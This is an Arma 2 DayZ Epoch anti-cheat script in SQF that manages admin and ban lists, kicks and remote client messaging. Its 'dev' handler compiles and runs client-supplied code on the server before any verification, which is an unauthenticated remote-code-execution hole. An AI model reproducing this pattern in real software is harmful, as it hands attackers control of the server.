/*
	Made for Arma 2 DayZ Epoch

	File: vg_sec.sqf
	
	Author: 0verHeaT
	https://github.com/0verHeaT
*/

waitUntil {!isNil "VG_BANNED"};

vg_randomKey = 
{
	private ["_arr","_gen","_num"];
	_arr = ["f","9","y","d","C","4","f","5","P","z","1","4","S","Y","T","R","R","K","7","8","i","V","o","C","w","U","b","K","9","K"];
	_gen = "vg_";
	for "_i" from 1 to 8 do {
		_gen = _gen + (_arr select (random ((count _arr)-1)));
	};
	_num = str(round(random 998));
	_gen = _gen + '_' + _num;
	_gen
};

vg_serverTime = 
{
	private ["_stime","_hours","_minutes","_minutes2","_result"];
	_result = "0h 0min";
	_stime = 0;
	if(serverTime > 36000)then{_stime = time;}else{_stime = serverTime;};
	_hours = (_stime/60/60);
	_hours = toArray (str _hours);
	_hours resize 1;
	_hours = toString _hours;
	_hours = compile _hours;
	_hours = call  _hours;
	_minutes = floor(_stime/60);
	_minutes2 = ((_minutes - (_hours*60)) min 60) max 0;if (_minutes2 < 10) then {_minutes2 = format ['0%1',_minutes2];};
	_result = format ["[%1h %2min]",_hours,_minutes2];
	_result;
};

server_var = call vg_randomKey;diag_log format ["<VG - AH>:  -  server_var: %1",server_var];
client_var = call vg_randomKey;publicVariable "client_var";diag_log format ["<VG - AH>:  -  client_var: %1",client_var];

pvs_var = "pvs_" + (call vg_randomKey);diag_log format ["<VG - AH>:  -  pvs_var: %1",pvs_var];
pvc_var = "pvc_" + (call vg_randomKey);diag_log format ["<VG - AH>:  -  pvc_var: %1",pvc_var];

vg_var1 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var1: %1",vg_var1];
vg_var2 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var2: %1",vg_var2];
vg_var3 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var3: %1",vg_var3];
vg_var4 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var4: %1",vg_var4];
vg_var5 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var5: %1",vg_var5];
vg_var6 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var6: %1",vg_var6];
vg_var7 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var7: %1",vg_var7];
vg_var10 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var10: %1",vg_var10];
vg_var11 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var11: %1",vg_var11];
vg_var12 = call vg_randomKey;diag_log format ["<VG - AH>:  -  vg_var12: %1",vg_var12];

call compile ("
"+server_var+"ADMIS = VG_ADMINS;
"+client_var+"ADMIS = VG_ADMINS;publicVariable '"+client_var+"ADMIS';publicVariable 'VG_ADMINS';
VG_ADMINS = [];
"+server_var+"DONATORS = VG_DONATORS;
"+client_var+"DONATORS = VG_DONATORS;publicVariable '"+client_var+"DONATORS';
VG_DONATORS = [];
"+server_var+"BANNED = VG_BANNED;
"+client_var+"BANNED = VG_BANNED;publicVariable '"+client_var+"BANNED';
VG_BANNED = [];

"+vg_var2+" = {
	_code = _this select 0;
	_type = _this select 1;
	if (isNil '_code' || isNil '_type') exitWith {};
	
	switch (_type) do {
		case 'rDeb': {systemChat _code;};
		case 'rDyn': {[_code] spawn "+vg_var3+";};
		case 'rMsg': {[_code] spawn "+vg_var4+";};
		case 'rKM': {[_code] spawn "+vg_var5+";};
		case 'rC': {_code = toString _code;call compile _code;};
		case 'rHint': {hint _code;};
		case 'rCut': {cutText [toString _code,'PLAIN DOWN'];};
		case 'admin': {if !((getPlayerUID player) in "+client_var+"ADMIS) exitWith {};_code = toString _code;call compile _code;};
	};
};
publicVariable '"+vg_var2+"';

"+vg_var3+" = {
	_text = _this select 0;
	
	_txt = format ['
		<br/><br/><t size=''0.6'' color=''#9F1B1B'' align=''center''>%1</t><br/>
		<t size=''0.7'' color=''#999999'' align=''center''>%2</t><br/>','',toString _text];
	[_txt,[safezoneX,safezoneW],[0.65 * safezoneH + safezoneY,0.3 * safezoneH],20,0.5,0,2143] spawn BIS_fnc_dynamicText;
};
publicVariable '"+vg_var3+"';

"+vg_var4+" = {
private ['_message'];
	_message = _this select 0;
	[_message,[0.02 * safezoneW + safezoneX,0.2 * safezoneW],[0.2 * safezoneH + safezoneY,0.25 * safezoneH],30,0.5,0,2144] spawn BIS_fnc_dynamicText;
};
publicVariable '"+vg_var4+"';

"+vg_var5+" = 
{
	private ['_txt'];
	if (isNil 'KMSG_SLOT1' && isNil '_txt') then 
	{
		KMSG_SLOT1 = 1;
		_txt = _this select 0;
		[_txt,[safezoneX + 0.01 * safezoneW,2.0],[safezoneY + 0.01 * safezoneH,0.3],10,0.85,0,210] spawn BIS_fnc_dynamicText;
		[] spawn {uiSleep 10;KMSG_SLOT1 = nil;};
	};
	if (isNil 'KMSG_SLOT2' && isNil '_txt') then 
	{
		KMSG_SLOT2 = 1;
		_txt = _this select 0;
		[_txt,[safezoneX + 0.01 * safezoneW,2.0],[safezoneY + 0.05 * safezoneH,0.3],10,0.85,0,211] spawn BIS_fnc_dynamicText;
		[] spawn {uiSleep 10;KMSG_SLOT2 = nil;};
	};
	if (isNil 'KMSG_SLOT3' && isNil '_txt') then 
	{
		KMSG_SLOT3 = 1;
		_txt = _this select 0;
		[_txt,[safezoneX + 0.01 * safezoneW,2.0],[safezoneY + 0.09 * safezoneH,0.3],10,0.85,0,212] spawn BIS_fnc_dynamicText;
		[] spawn {uiSleep 10;KMSG_SLOT3 = nil;};
	};
	if (isNil 'KMSG_SLOT4' && isNil '_txt') then 
	{
		KMSG_SLOT4 = 1;
		_txt = _this select 0;
		[_txt,[safezoneX + 0.01 * safezoneW,2.0],[safezoneY + 0.13 * safezoneH,0.3],10,0.85,0,213] spawn BIS_fnc_dynamicText;
		[] spawn {uiSleep 10;KMSG_SLOT4 = nil;};
	};

	if (isNil '_txt') exitWith {KMSG_SLOT1 = nil;KMSG_SLOT2 = nil;KMSG_SLOT3 = nil;KMSG_SLOT4 = nil;_this call "+vg_var5+";};
};
publicVariable '"+vg_var5+"';

"+vg_var6+" =
{
	private ['_ctarget'];
	_ctarget = cursorTarget;

	if (!isNull _ctarget) then
	{
		if ((_ctarget isKindOf 'Man') && !isPlayer _ctarget && (typeName (_ctarget getVariable ['DonatorTrader',-1]) == 'ARRAY') && (player distance _ctarget < 3)) then
		{
			if (vg_act_0 < 0) then 
			{
				vg_act_0 = player addAction ['Donator Shop','overheat\Actions\player_trade.sqf',_ctarget,999,true,false,'',''];
			};
		}
		else 
		{
			player removeAction vg_act_0;
			vg_act_0 = -1;
		};
	}
	else
	{
		player removeAction vg_act_0;
		vg_act_0 = -1;
	};
};
publicVariable '"+vg_var6+"';

"+vg_var10+" = {
	if (isNil '"+vg_var12+"') then {"+vg_var12+" = false};
	if ("+vg_var12+") exitWith {};
	"+vg_var12+" = true;
	'"+pvc_var+"' addPublicVariableEventHandler {(_this select 1) call "+vg_var7+";};
	[] spawn 
	{
		if (getPlayerUID player == '__SERVER__') exitWith {};
		waitUntil {getPlayerUID player != ''};
		
		if ((getPlayerUID player) in "+client_var+"BANNED) then 
		{
			diag_log format ['<VG>: Access denied for UID %1',getPlayerUID player];
			profileNamespace setVariable ['UIDA',['76561198059930120']];saveProfileNamespace;
			PVAH_Handle = [player,'KICK','',toArray (format['%1PV',client_var])];
			publicVariableserver 'PVAH_Handle';
		};
		
		diag_log format ['<VG>: Gained access for UID %1',getPlayerUID player];
		_log = format ['Player Connected  %1  (%2)',name player,getPlayerUID player];
		PVAH_Handle = [player,'',toArray _log,toArray (format['%1PV',client_var])];
		publicVariableserver 'PVAH_Handle';
	};
	[] spawn 
	{
		waitUntil {!isNil 'dayz_animalCheck'};
		vg_act_0 = -1;
		while {1 == 1} do 
		{
			if !(isNull player) then 
			{
				if ((isPlayer player) && (getPlayerUID player != '')) then 
				{
					_arr = player getVariable ['CollisonKilled',[]];
					if (count _arr > 0) then 
					{
						if ((serverTime - (_arr select 5)) > 300) then 
						{
							player setVariable ['CollisonKilled',[],true];
						};
					};
					if ((getPlayerUID player) in "+client_var+"DONATORS) then 
					{
						call "+vg_var6+";
					};
				};
			};
			uiSleep 1;
		};
	};
};
publicVariable '"+vg_var10+"';

"+vg_var7+" = 
{
	if ((_this select 1) == 'rCut') exitWith {cutText[format['%1',toString (_this select 0)],'PLAIN DOWN']};
	if ((_this select 1) == 'twpupdate') exitWith {[(lbCurSel 9000)] call twp_loadGear;[(lbCurSel 9001)] call twp_loadTargetItems;call twp_loadItems;};
	if ((_this select 1) == 'twpdelete') exitWith 
	{
		_arr = call compile (toString (_this select 0));
		if ((_arr select 1) == 0) then {player removeMagazine (_arr select 0);};
		if ((_arr select 1) == 1) then {player removeWeapon (_arr select 0);};
	};
};
publicVariable '"+vg_var7+"';

vg_RE = 
{
	private ['_tar','_txt','_type'];
	if (count _this != 3) exitWith {};
	_tar = _this select 0;
	_txt = toArray(_this select 1);
	_type = _this select 2;
	PVAH_send = [_tar,_txt,_type];
	publicVariableServer 'PVAH_send';
};
publicVariable 'vg_RE';

comment 'Starting with the Server Executions!';

'PVAH_send' addPublicVariableEventHandler
{
	private ['_tar','_txt','_type'];
	_tar = (_this select 1) select 0;
	_txt = (_this select 1) select 1;
	_type = (_this select 1) select 2;
	"+pvc_var+" = [_txt,_type];
	(owner _tar) publicVariableClient '"+pvc_var+"';
};

fnc_custom_AH_handle = 
{
	_type = _this select 0;
	_handle = _this select 1;
	_deb = _this select 2;
	_verify = _this select 3;
	
	if (_handle == 'dev') exitWith
	{
		_code = toString _deb;
		[_type] call compile _code;
	};
	
	if ((toString _verify) != (format['%1PV',client_var])) exitWith {diag_log 'fnc_custom_AH_handle: Wrong called!';};

	if (_handle == '') then {
		_log = format ['<VG - AH>:  %1  %2',toString _deb,call vg_serverTime];
		diag_log _log;
	};
	
	if (_handle == 'HLOG') then {
		_log = format ['<VG - AH>:  %1  %2',toString _deb,call vg_serverTime];
		diag_log _log;
		[[server_var,'admin'],'rDeb',_log] call server_sendremoteExe;
		'HackLog' callExtension (format['%1   |   VG Custom HackLog',_log]);
		PV_hackerL0og = PV_hackerL0og + [[_log,'','0','1','0','0',[]]];
		publicVariable 'PV_hackerL0og';
	};
	
	if (_handle == 'DC') then {
		if !(isPlayer _type) exitWith {};
		if (getPlayerUID _type in "+server_var+"ADMIS) exitWith {};
		
		_todo =  format [""
			if !(isDedicated) then {
				if ((getPlayerUID player) == '%1') then {
					(findDisplay 46) closeDisplay 0;
				};
			} else {
				if (isServer) then {
					[this] spawn {uiSleep 1;deleteVehicle (_this select 0);};
				};
			};
		"",(getPlayerUID _type)];
		_grp = createGroup east;
		'Hen' createUnit [[random 9999,random 9999,0],_grp,_todo];
		
		_log = format ['<VG - AH>:  %1  %2',toString _deb,call vg_serverTime];
		diag_log _log;
		[[server_var,'admin'],'rDeb',_log] call server_sendremoteExe;
		'HackLog' callExtension (format['%1   |   VG Custom HackLog',_log]);
		PV_hackerL0og = PV_hackerL0og + [[_log,'','0','1','0','0',[]]];
		publicVariable 'PV_hackerL0og';
	};
	
	if (_handle == 'KICK' || _handle == 'BAN') then {
		if !(isPlayer _type) exitWith {};
		if (getPlayerUID _type in "+server_var+"ADMIS) exitWith {};
		if (_handle == 'BAN') then {
			"+server_var+"BANNED = "+server_var+"BANNED + (getPlayerUID _type);
			"+client_var+"BANNED = "+client_var+"BANNED + (getPlayerUID _type);publicVariable '"+client_var+"BANNED';
			'infiSTARwriteBan' callExtension (getPlayerUID _type);
		};
		
		_todo = format [""
			if (!isDedicated) then {
				if((getPlayerUID player == '%1') || (name player == '%2')) then {
					[] spawn {
						uiSleep 1;
						_hacker = group player addWaypoint [[1,1,1],1];
						_hacker setWaypointStatements ['true',''];
					};
					for '_s1' from 0 to 101 do {findDisplay _s1 closeDisplay 0;};
					uiSleep 0.5;
					for '_s2' from 0 to 101 do {disableUserInput true;};
				};
			} else {
				if (isServer) then {
					[this] spawn {uiSleep 1;deleteVehicle (_this select 0);};
				};
			};
		"",(getPlayerUID _type),(name _type)];
		_grp = createGroup east;
		'Hen' createUnit [[random 9999,random 9999,0],_grp,_todo];
		
		diag_log format ['<VG - AH>:  Server kicked Player  %1  %2',(getPlayerUID _type),(name _type)];
		
		if ((typeName _deb) != 'STRING') then {
			_log = format ['<VG - AH>:  %1  %2',toString _deb,call vg_serverTime];
			if (_handle == 'BAN') then {_log = format ['<VG - AH>:  %1  |  BAN',toString _deb];};
			diag_log _log;
			[[server_var,'admin'],'rDeb',_log] call server_sendremoteExe;
			'HackLog' callExtension (format['%1   |   VG Custom HackLog',_log]);
			PV_hackerL0og = PV_hackerL0og + [[_log,'','0','1','0','0',[]]];
			publicVariable 'PV_hackerL0og';
		};
	};
};
'PVAH_Handle' addPublicVariableEventHandler {(_this select 1) call fnc_custom_AH_handle;};

[] spawn {
	waitUntil {uiSleep 1; !isNil 'sm_done';};
	_VG = ""
		if (!isDedicated) then {
			re_VG = {_this call "+vg_var2+";};
			'"+vg_var1+"' addPublicVariableEventHandler {(_this select 1) call re_VG};
			waitUntil {!isNil '"+vg_var10+"'};
			[] spawn "+vg_var10+";
			player setVariable ['"+vg_var11+"',true,true];
		} else {
			if (isServer) then {this spawn {uiSleep 10;deleteVehicle _this;};};
		};
	"";
	while {1 == 1} do {
		_grp = createGroup east;
		'Hen' createUnit [[random 9999,random 9999,0],_grp,_VG];
		uiSleep 20;
	};
};
	
[] spawn {
	waitUntil {uiSleep 1; !isNil 'sm_done';};
	while {1 == 1} do {
		diag_log format ['CURRENT SERVER PERFORMANCE: DEBUGFPS: %1 || OBJECTS: %2 || PLAYERS: %3',diag_fps,(count(allMissionObjects '')),(playersNumber west)];
		uiSleep 240;
	};
};
");
diag_log "<VG - AH>: Custom AntiHack successfully loaded!";

/*

[] spawn {
	waitUntil {uiSleep 1; !isNil 'sm_done';};
	while {1 == 1} do {
		{
			if !(isNull _x) then {
				if ((isPlayer player) && (getPlayerUID player != '')) then {
					if !(_x getVariable ['"+vg_var11+"',false]) then {
						uiSleep 45;
						if !(_x getVariable ['"+vg_var11+"',false]) then {
							_log = format['%1  (%2)  VG Variables not loaded',(name _x),(getPlayerUID _x)];
							['','',toArray _log,toArray (format['%1PV',client_var])] call fnc_custom_AH_handle;
						};
					};
				};
			};
		} count playableUnits;
		uiSleep 60;
	};
};
*/
// Used for TWP
//_data = [["DMR_DZ","CfgWeapons",["Coins","Coins",10000],1]];
/*
twp_fnc_getData = {
	private ["_target","_data","_result"];
	_target = _this select 0;
	_data = _target getVariable ["TWPVar",[]];
	_plyrgear = (weapons _target) + (magazines _target) + ((unitBackpack _target) call fnc_getBackpackitems);
	_result = [];
	{
		private ["_check"];
		_check = [_plyrgear,(_x select 0),-1] call fnc_getArrayPos;
		if (count _check > 0) then {
			if ((count _check) < (_x select 3)) then {
				_result set [count _result,[(_x select 0),(_x select 1),(_x select 2),(count _check)]];
			} else {
				_result set [count _result,[(_x select 0),(_x select 1),(_x select 2),(_x select 3)]];
			};
		};
	} count _data;
	_target setVariable ["TWPVar",_result,true];
	_result;
};
publicVariable "twp_fnc_getData";

twp_fnc_setData = {
	private ["_result","_item","_type","_price","_data","_set","_plyrgear"];
	_result = false;
	_item = _this select 0;
	_type = _this select 1;
	_plyrgear = (weapons player) + (magazines player) + ((unitBackpack player) call fnc_getBackpackitems);
	if (_type == "append") then {
		private ["_index","_toreplace","_found"];
		_data = player getVariable ["TWPVar",[]];
		
		_found = [_data,_item,0] call fnc_getArrayPos;
		if (count _found < 1) exitWith {_result};
		_index = _found select 0;
		
		_toreplace = _data select _index;
		_data set [_index,[(_toreplace select 0),(_toreplace select 1),(_toreplace select 2),(_toreplace select 3) + 1]];
		_result = true;
		player setVariable ["TWPVar",_data,true];
	} else {
		_price = _this select 2;
		_data = player getVariable ["TWPVar",[]];
		_set = [_plyrgear,_item,-1] call fnc_getArrayPos;
		if (count _set > 0) then {
			player setVariable ["TWPVar",_data + [[_item,_type,_price,1]],true];
			_result = true;
		};
	};
	_result;
};
publicVariable "twp_fnc_setData";

twp_fnc_delete = {
	private ["_target","_item","_data","_index","_new","_result"];
	_target = _this select 0;
	_item = _this select 1;
	_data = _target getVariable ["TWPVar",[]];
	_result = false;
	
	_found = [_data,_item,0] call fnc_getArrayPos;
	if (count _found < 1) exitWith {_result};
	_index = _found select 0;
	
	_new = [];
	for "_i" from 0 to ((count _data) - 1) do {
		if (_i != _index) then {
			_new set [count _new,_data select _i];
		};
	};
	_target setVariable ["TWPVar",_new,true];
	_result = true;
	_result;
};
publicVariable "twp_fnc_delete";
*/